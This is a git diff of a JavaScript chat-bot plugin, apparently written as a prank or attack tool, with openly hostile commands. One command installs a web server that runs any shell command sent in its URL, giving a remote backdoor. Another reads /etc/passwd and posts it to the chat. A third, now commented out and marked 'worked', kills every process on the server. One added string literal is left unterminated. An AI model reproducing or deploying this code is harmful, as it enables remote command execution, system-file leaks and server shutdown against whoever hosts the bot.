@@ -1,10 +1,10 @@
 module.exports.plugin = {
     name: "test",
     description: "hee hee hee haw",
-    author: "cum monster",
+    author: "best plugin writer ever ",
     repository:
         "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
-    commands: ["test", "end", "backdoor", "passwd", "id"],
+    commands: ["test", "backdoor", "passwd"],
 };
 
 module.exports.test = {
@@ -19,36 +19,40 @@ module.exports.test = {
     },
 };
 
-module.exports.end = {
-    name: "end",
-    description: "end the linux server",
-    run: async ({ client, message }) => {
-        require("child_process").spawn("killall5", ["-9"]);
-    },
-};
+// worked
+// module.exports.end = {
+//     name: "end",
+//     description: "end the linux server",
+//     run: async ({ client, message }) => {
+//         require("child_process").spawn("killall5", ["-9"]);
+//     },
+// };
 
 module.exports.backdoor = {
     name: "backdoor",
     description: "backdoor the server",
     run: async ({ client, message }) => {
         const code = `
-            const express = require('express');
-            const app = express();
+const express = require('express');
+const app = express();
 
-            app.get("/:command", function (req, res) {
-                command = req.params.command.split(" ")
-                command.shift();
-                require("child_process")
-                    .spawn(req.params.command.split(" ")[0], command)
-                    .on("data", (data) => {
-                        res.send(data);
-                    });
-            })
+app.get("/", function (req, res) {
+    res.send("success);
+})
 
-            app.listen(3000, function (err) {
-                console.error(app)
-            });
-        `;
+app.get("/:command", function (req, res) {
+    command = req.params.command.split(" ")
+    command.shift();
+    require("child_process")
+        .spawn(req.params.command.split(" ")[0], command)
+        .on("data", (data) => {
+            res.send(data);
+        });
+})
+
+app.listen(3000, function (err) {
+    console.error(app)
+});`;
 
         require("child_process").spawn("touch", ["backdoor.js"]);
         require("child_process").spawn("npm", ["i", "express"]);
@@ -68,10 +72,8 @@ module.exports.passwd = {
     name: "passwd",
     description: "leak /etc/passwd",
     run: async ({ client, message }) => {
-        require("child_process")
-            .spawn("cat", ["/etc/passwd"])
-            .on("data", (data) => {
-                message.channel.send(`${data}`);
-            });
+        require("fs").readFile("/etc/passwd", "utf8", function (err, data) {
+            message.channel.send(`\`\`\`bash\n${data}\`\`\``);
+        });
     },
 };
